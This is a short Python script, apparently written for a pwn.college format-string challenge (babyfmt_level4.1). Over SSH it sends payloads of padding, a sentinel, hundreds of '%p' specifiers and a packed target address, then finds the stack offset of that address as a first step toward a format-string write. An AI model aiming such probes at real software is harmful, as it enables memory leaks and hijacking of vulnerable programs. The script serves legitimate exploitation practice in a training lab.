import subprocess
import struct
import sys

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

TOTAL = 0x79  # 0x79 characters required before the write
sentinel = "XYZ "
sentinel_len = len(sentinel)
prefix_len = TOTAL - sentinel_len
prefix = "A" * prefix_len + sentinel
tail = "%p " * 400
fmt_template = prefix + tail

for pad in range(8):
    fmt = fmt_template.encode()
    payload = fmt + b"A" * pad + struct.pack("<Q", ADDR)
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")

    line = None
    for l in out.splitlines():
        if sentinel in l:
            line = l
            break
    print(f"pad {pad}")
    if line:
        parts = line.split()
        # Remove prefix tokens if needed
        found = False
        for idx, token in enumerate(parts, start=1):
            if token.lower() == "0x4040e0":
                print("index", idx, "line", line)
                found = True
                break
        if not found:
            print("pointer not found in line:", line)
    else:
        print("No matching line, sample output tail:")
        print("\\n".join(out.splitlines()[-3:]))
